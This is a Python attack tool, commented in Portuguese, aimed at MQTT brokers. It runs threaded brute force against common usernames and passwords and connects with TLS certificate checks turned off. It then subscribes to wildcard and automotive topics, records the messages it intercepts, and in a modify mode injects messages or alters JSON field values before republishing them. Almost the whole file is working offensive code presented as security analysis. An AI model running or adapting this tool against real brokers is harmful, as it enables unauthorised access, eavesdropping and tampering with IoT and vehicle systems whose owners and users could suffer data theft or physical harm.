"""
MQTT Explorer - Ferramenta de Análise de Segurança
--------------------------------------
Este script tenta explorar e analisar vulnerabilidades em brokers MQTT
através de conexão direta, tentativas de autenticação e enumeration de tópicos.
"""

import os
import re
import json
import socket
import ssl
import time
import random
import string
import logging
import argparse
import json
import threading
from datetime import datetime
from queue import Queue

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("Biblioteca Paho MQTT não encontrada. Instalando...")
    import subprocess
    subprocess.check_call(["pip", "install", "paho-mqtt"])
    import paho.mqtt.client as mqtt

# Importar configurações do config.py
from config import (
    RESULTS_DIR, COMMON_USERNAMES, COMMON_PASSWORDS, 
    COMMON_TOPICS, AUTOMOTIVE_TOPICS, MAX_THREADS, 
    TIMEOUT, WAIT_TIME
)

# Importar funções de relatório
from report_generator import save_and_report_results
# Importar modificador MQTT
from mqtt_modifier import MQTTModifier

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("mqtt_explorer.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Resultados da exploração
exploration_results = {
    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    "targets": [],
    "vulnerable_targets": [],
    "discovered_topics": [],
    "intercepted_messages": []
}

# Mutex para proteger os resultados de exploração em threads concorrentes
results_lock = threading.Lock()

# Função de callback para conexão MQTT
def on_connect(client, userdata, flags, rc):
    connection_info = userdata.get("connection_info", {})
    host = connection_info.get("host", "unknown")
    port = connection_info.get("port", "unknown")
    username = connection_info.get("username", "")
    
    if rc == 0:
        result = f"Conectado com sucesso ao broker {host}:{port}"
        if username:
            result += f" com usuário '{username}'"
        logger.info(result)
        
        # Registrar conexão bem-sucedida nos resultados
        with results_lock:
            target_info = {
                "host": host,
                "port": port,
                "connection_successful": True,
                "username": username,
                "password": connection_info.get("password", ""),
                "use_ssl": connection_info.get("use_ssl", False),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            exploration_results["targets"].append(target_info)
            
            # Se a conexão foi bem-sucedida sem credenciais ou com credenciais fracas, registrar como vulnerável
            if not username or username in COMMON_USERNAMES[:5] and connection_info.get("password", "") in COMMON_PASSWORDS[:5]:
                target_info["vulnerability"] = "Conexão com credenciais fracas ou sem autenticação"
                exploration_results["vulnerable_targets"].append(target_info)
    else:
        rc_meanings = {
            1: "Conexão recusada - Versão de protocolo incorreta",
            2: "Conexão recusada - Identificador de cliente inválido",
            3: "Conexão recusada - Servidor indisponível",
            4: "Conexão recusada - Usuário ou senha incorretos",
            5: "Conexão recusada - Não autorizado"
        }
        
        error_msg = rc_meanings.get(rc, f"Falha na conexão com código desconhecido: {rc}")
        logger.warning(f"Falha ao conectar ao broker {host}:{port}: {error_msg}")
        
        # Registrar falha de conexão nos resultados
        with results_lock:
            target_info = {
                "host": host,
                "port": port,
                "connection_successful": False,
                "error_code": rc,
                "error_message": error_msg,
                "username": username,
                "password": connection_info.get("password", ""),
                "use_ssl": connection_info.get("use_ssl", False),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            exploration_results["targets"].append(target_info)

# Função de callback para mensagens recebidas
def on_message(client, userdata, msg):
    connection_info = userdata.get("connection_info", {})
    host = connection_info.get("host", "unknown")
    port = connection_info.get("port", "unknown")
    
    try:
        payload_str = msg.payload.decode('utf-8')
        logger.info(f"Mensagem recebida do tópico {msg.topic} de {host}:{port}: {payload_str[:100]}...")
        
        # Registrar mensagem interceptada
        with results_lock:
            message_info = {
                "host": host,
                "port": port,
                "topic": msg.topic,
                "payload": payload_str,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            exploration_results["intercepted_messages"].append(message_info)
            
            # Adicionar tópico descoberto se ainda não existir
            if msg.topic not in [t["topic"] for t in exploration_results["discovered_topics"]]:
                topic_info = {
                    "host": host,
                    "port": port,
                    "topic": msg.topic,
                    "discovery_method": "message_interception",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                exploration_results["discovered_topics"].append(topic_info)
    except Exception as e:
        logger.error(f"Erro ao processar mensagem de {host}:{port}: {e}")

# Função de callback para inscrição
def on_subscribe(client, userdata, mid, granted_qos):
    connection_info = userdata.get("connection_info", {})
    host = connection_info.get("host", "unknown")
    port = connection_info.get("port", "unknown")
    topic = userdata.get("current_topic", "unknown")
    
    logger.info(f"Inscrito no tópico {topic} em {host}:{port} com QoS {granted_qos}")
    
    # Registrar tópico descoberto
    with results_lock:
        topic_info = {
            "host": host,
            "port": port,
            "topic": topic,
            "discovery_method": "subscription",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if topic_info not in exploration_results["discovered_topics"]:
            exploration_results["discovered_topics"].append(topic_info)

# Função para testar conexão com um broker MQTT
def test_mqtt_connection(host, port, username="", password="", use_ssl=False, timeout=TIMEOUT):
    logger.info(f"Testando conexão com {host}:{port} (SSL: {use_ssl}, Usuário: {username})")
    
    # Criar cliente MQTT com ID aleatório para evitar colisões
    client_id = f"mqtt-explorer-{random.randint(1000, 9999)}"
    client = mqtt.Client(client_id=client_id)
    
    # Configurar callbacks
    connection_info = {
        "host": host,
        "port": port,
        "username": username,
        "password": password,
        "use_ssl": use_ssl
    }
    userdata = {"connection_info": connection_info}
    client.user_data_set(userdata)
    client.on_connect = on_connect
    client.on_message = on_message
    client.on_subscribe = on_subscribe
    
    # Configurar autenticação se fornecida
    if username:
        client.username_pw_set(username, password)
    
    # Configurar SSL se necessário
    if use_ssl:
        client.tls_set(cert_reqs=ssl.CERT_NONE)  # Não verificar certificado do servidor
        client.tls_insecure_set(True)
    
    # Tentar conexão
    try:
        client.connect(host, port, timeout)
        client.loop_start()
        
        # Aguardar conexão ser estabelecida ou falhar
        time.sleep(2)
        
        # Verificar se está conectado
        if client.is_connected():
            # Tentar se inscrever em tópicos comuns
            for topic in COMMON_TOPICS + AUTOMOTIVE_TOPICS:
                try:
                    userdata["current_topic"] = topic
                    client.user_data_set(userdata)
                    client.subscribe(topic)
                    time.sleep(0.5)  # Pequeno delay entre inscrições
                except Exception as e:
                    logger.warning(f"Erro ao se inscrever no tópico {topic}: {e}")
            
            # Aguardar mensagens por um curto período
            logger.info(f"Aguardando mensagens de {host}:{port}...")
            time.sleep(WAIT_TIME)
            
            # Registrar conexão bem-sucedida (já feito no callback)
            result = True
        else:
            result = False
            
        # Desconectar cliente
        client.loop_stop()
        client.disconnect()
        
        return result
    except Exception as e:
        logger.warning(f"Erro ao conectar a {host}:{port}: {e}")
        
        # Registrar erro de conexão nos resultados (se não foi registrado no callback)
        with results_lock:
            connection_error = True
            for target in exploration_results["targets"]:
                if target["host"] == host and target["port"] == port and target.get("username", "") == username:
                    connection_error = False
                    break
            
            if connection_error:
                target_info = {
                    "host": host,
                    "port": port,
                    "connection_successful": False,
                    "error_message": str(e),
                    "username": username,
                    "password": password,
                    "use_ssl": use_ssl,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                exploration_results["targets"].append(target_info)
        
        try:
            client.loop_stop()
            client.disconnect()
        except:
            pass
        
        return False

# Função para testar múltiplas credenciais
def test_multiple_credentials(host, port, use_ssl=False):
    logger.info(f"Testando diferentes credenciais em {host}:{port}...")
    
    credentials_queue = Queue()
    
    # Adicionar combinações username/password à fila
    for username in COMMON_USERNAMES:
        # Primeiro tenta sem senha para cada username
        credentials_queue.put((username, ""))
        
        # Depois tenta com cada senha comum
        for password in COMMON_PASSWORDS:
            if password:  # Evitar duplicar a tentativa sem senha
                credentials_queue.put((username, password))
    
    # Função worker para threads
    def credential_worker():
        while not credentials_queue.empty():
            try:
                username, password = credentials_queue.get(block=False)
                test_mqtt_connection(host, port, username, password, use_ssl)
                time.sleep(1)  # Delay para evitar bloqueio por tentativas rápidas demais
            except Exception as e:
                logger.error(f"Erro no worker de credenciais: {e}")
            finally:
                credentials_queue.task_done()
    
    # Iniciar múltiplas threads para testar credenciais
    num_workers = min(MAX_THREADS, credentials_queue.qsize())  # Limite de threads configurável
    threads = []
    
    for _ in range(num_workers):
        thread = threading.Thread(target=credential_worker)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Aguardar todas as threads completarem
    for thread in threads:
        thread.join()

# Função para testar um único alvo MQTT
def explore_mqtt_target(host, port, use_ssl=False):
    logger.info(f"Explorando alvo MQTT: {host}:{port} (SSL: {use_ssl})")
    
    # Primeiro testar sem credenciais (conexão anônima)
    anonymous_connection = test_mqtt_connection(host, port, "", "", use_ssl)
    
    # Testar múltiplas credenciais APENAS se o teste sem credenciais falhou
    if not anonymous_connection:
        logger.info(f"Conexão anônima falhou para {host}:{port}. Tentando brute force.")
        test_multiple_credentials(host, port, use_ssl)
    else:
        logger.warning(f"Vulnerabilidade: {host}:{port} permite conexão sem autenticação! Pulando brute force.")

# Função principal para exploração de MQTT
def explore_mqtt_targets(targets):
    logger.info(f"Iniciando exploração de {len(targets)} alvos MQTT")
    
    # Inicializar resultados
    exploration_results["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exploration_results["targets"] = []
    exploration_results["vulnerable_targets"] = []
    exploration_results["discovered_topics"] = []
    exploration_results["intercepted_messages"] = []
    
    # Explorar cada alvo
    for target in targets:
        host = target["host"]
        port = target.get("port", 1883)  # Porta padrão MQTT
        use_ssl = target.get("use_ssl", False)
        
        # Verificar se o host é válido
        try:
            socket.gethostbyname(host)
        except socket.gaierror:
            logger.error(f"Host inválido: {host}")
            continue
        
        explore_mqtt_target(host, port, use_ssl)
    
    # Salvar resultados e gerar relatório (usando o módulo report_generator)
    save_and_report_results(exploration_results, targets)
    
    return exploration_results

# Função para analisar URL MQTT e extrair host, porta e SSL
def parse_mqtt_url(url):
    # Padrões para URLs MQTT
    mqtt_patterns = [
        re.compile(r'^mqtt://(?P<host>[^:/]+)(?::(?P<port>\d+))?'),
        re.compile(r'^mqtts://(?P<host>[^:/]+)(?::(?P<port>\d+))?'),
        re.compile(r'^ssl://(?P<host>[^:/]+)(?::(?P<port>\d+))?'),
        re.compile(r'^tcp://(?P<host>[^:/]+)(?::(?P<port>\d+))?'),
    ]
    
    # Se a URL não começa com um protocolo conhecido, assumir que é apenas o host
    if not (url.startswith('mqtt://') or url.startswith('mqtts://') or 
            url.startswith('ssl://') or url.startswith('tcp://')):
        url = 'mqtt://' + url
    
    # Verificar padrões
    for pattern in mqtt_patterns:
        match = pattern.match(url)
        if match:
            host = match.group('host')
            port_str = match.group('port')
            
            # Determinar porta e SSL com base no protocolo
            use_ssl = url.startswith('mqtts://') or url.startswith('ssl://')
            
            if port_str:
                port = int(port_str)
            else:
                port = 8883 if use_ssl else 1883  # Portas padrão
            
            return {"host": host, "port": port, "use_ssl": use_ssl}
    
    # Se chegou aqui, não conseguiu analisar a URL
    logger.error(f"Não foi possível analisar a URL MQTT: {url}")
    return None

# Função principal
def main():
    parser = argparse.ArgumentParser(description="MQTT Explorer - Ferramenta de Análise de Segurança")
    parser.add_argument("--url", type=str, help="URL MQTT única para explorar (formato: mqtt://host:port ou mqtts://host:port)")
    parser.add_argument("--url-file", type=str, help="Arquivo contendo lista de URLs MQTT para explorar (uma por linha)")
    parser.add_argument("--host", type=str, help="Host MQTT para explorar")
    parser.add_argument("--port", type=int, default=1883, help="Porta MQTT (padrão: 1883)")
    parser.add_argument("--ssl", action="store_true", help="Usar SSL/TLS para conexão")
    parser.add_argument("--report", action="store_true", help="Gerar relatório HTML de vulnerabilidades")
    
    # Argumentos para modificação de mensagens
    parser.add_argument("--modify", action="store_true", help="Entrar no modo de modificação de mensagens")
    parser.add_argument("--topic", type=str, help="Tópico específico para interceptar ou publicar mensagens")
    parser.add_argument("--inject", type=str, help="Mensagem a ser injetada em um tópico")
    parser.add_argument("--field", type=str, help="Campo JSON a ser modificado em mensagens interceptadas")
    parser.add_argument("--value", type=str, help="Novo valor para o campo modificado")
    parser.add_argument("--multiply", type=float, help="Fator de multiplicação para valores numéricos")
    parser.add_argument("--republish", action="store_true", default=True, help="Republicar mensagens modificadas")
    args = parser.parse_args()
    
    logger.info("Iniciando MQTT Explorer")
    
    # Lista de alvos para explorar
    targets = []
    
    # Adicionar alvo de URL única
    if args.url:
        target = parse_mqtt_url(args.url)
        if target:
            targets.append(target)
    
    # Adicionar alvos de arquivo
    if args.url_file:
        try:
            with open(args.url_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url and not url.startswith('#'):  # Ignorar linhas vazias e comentários
                        target = parse_mqtt_url(url)
                        if target:
                            targets.append(target)
        except Exception as e:
            logger.error(f"Erro ao ler arquivo de URLs: {e}")
    
    # Adicionar alvo de parâmetros host/port
    if args.host:
        targets.append({
            "host": args.host,
            "port": args.port,
            "use_ssl": args.ssl
        })
    
    # Se nenhum alvo foi especificado, mostrar ajuda
    if not targets:
        parser.print_help()
        logger.error("Nenhum alvo MQTT especificado. Use --url, --url-file ou --host.")
        return
    
    # Mostrar alvos
    logger.info(f"Alvos MQTT para exploração:")
    for i, target in enumerate(targets, 1):
        logger.info(f"{i}. {target['host']}:{target['port']} (SSL: {target['use_ssl']})")
    
    # Verificar se é modo de modificação
    if args.modify:
        logger.info("Iniciando modo de modificação de mensagens MQTT")
        
        # Obter o primeiro alvo para modificação
        if not targets:
            logger.error("Nenhum alvo especificado para modificação. Use --url ou --host")
            return
        
        target = targets[0]  # Usar apenas o primeiro alvo no modo de modificação
        logger.info(f"Usando alvo: {target['host']}:{target['port']} (SSL: {target['use_ssl']})")
        
        # Criar modificador
        modifier = MQTTModifier(
            target["host"], 
            target["port"], 
            username="",  # Usar autenticação anônima inicialmente
            password="", 
            use_ssl=target["use_ssl"]
        )
        
        # Tentar conectar
        if not modifier.connect():
            logger.error("Falha ao conectar para modificação. Tentando com credenciais...")
            
            # Testar credenciais comuns
            connected = False
            for username in COMMON_USERNAMES[:5]:  # Testar apenas os primeiros usernames
                for password in COMMON_PASSWORDS[:5]:  # e senhas
                    modifier = MQTTModifier(
                        target["host"], 
                        target["port"], 
                        username=username,
                        password=password, 
                        use_ssl=target["use_ssl"]
                    )
                    if modifier.connect():
                        logger.info(f"Conectado com credenciais: {username}:{password}")
                        connected = True
                        break
                if connected:
                    break
            
            if not connected:
                logger.error("Não foi possível conectar ao broker para modificação")
                return
        
        # Configurar função de modificação
        modifier_func = None
        
        if args.field and args.value:  # Modificar um campo específico
            from mqtt_modifier import json_field_modifier
            modifier_func = json_field_modifier(args.field, args.value)
            logger.info(f"Configurado para modificar o campo '{args.field}' para '{args.value}'")
        elif args.field and args.multiply:  # Multiplicar um valor
            from mqtt_modifier import json_value_multiplier
            modifier_func = json_value_multiplier(args.field, args.multiply)
            logger.info(f"Configurado para multiplicar o campo '{args.field}' por {args.multiply}")
        
        # Injetar uma mensagem específica ou iniciar interceptação
        if args.topic and args.inject:
            logger.info(f"Injetando mensagem no tópico {args.topic}")
            modifier.publish_message(args.topic, args.inject)
            logger.info("Mensagem injetada com sucesso. Encerrando.")
            modifier.stop()
            return
        else:
            # Iniciar interceptação
            topics = [args.topic] if args.topic else ["#"]
            logger.info(f"Iniciando interceptação nos tópicos: {', '.join(topics)}")
            modifier.start_interception(topic_filters=topics, modifier_func=modifier_func, republish=args.republish)
            
            try:
                # Manter o programa em execução
                logger.info("Interceptação em andamento. Pressione Ctrl+C para encerrar...")
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("Interceptação encerrada pelo usuário.")
                modifier.stop()
                return
    
    # Modo normal de exploração
    else:
        # Executar exploração
        results = explore_mqtt_targets(targets)
        
        # Exibir resumo
        logger.info("Resumo da exploração:")
    
    vulnerable_count = len(results["vulnerable_targets"])
    if vulnerable_count > 0:
        logger.warning(f"Encontrados {vulnerable_count} alvos vulneráveis:")
        for i, target in enumerate(results["vulnerable_targets"], 1):
            vuln_info = f"{i}. {target['host']}:{target['port']}"
            if "vulnerability" in target:
                vuln_info += f" - {target['vulnerability']}"
            logger.warning(vuln_info)
    else:
        logger.info("Nenhum alvo vulnerável encontrado.")
    
    topic_count = len(results["discovered_topics"])
    if topic_count > 0:
        logger.info(f"Descobertos {topic_count} tópicos:")
        for i, topic_info in enumerate(results["discovered_topics"][:10], 1):  # Mostrar apenas os 10 primeiros
            logger.info(f"{i}. {topic_info['topic']} em {topic_info['host']}:{topic_info['port']}")
        if topic_count > 10:
            logger.info(f"... e mais {topic_count - 10} tópicos")
    else:
        logger.info("Nenhum tópico descoberto.")
    
    message_count = len(results["intercepted_messages"])
    if message_count > 0:
        logger.info(f"Interceptadas {message_count} mensagens.")
    else:
        logger.info("Nenhuma mensagem interceptada.")
    
    logger.info(f"Resultados completos salvos em: {RESULTS_DIR}")

if __name__ == "__main__":
    main()
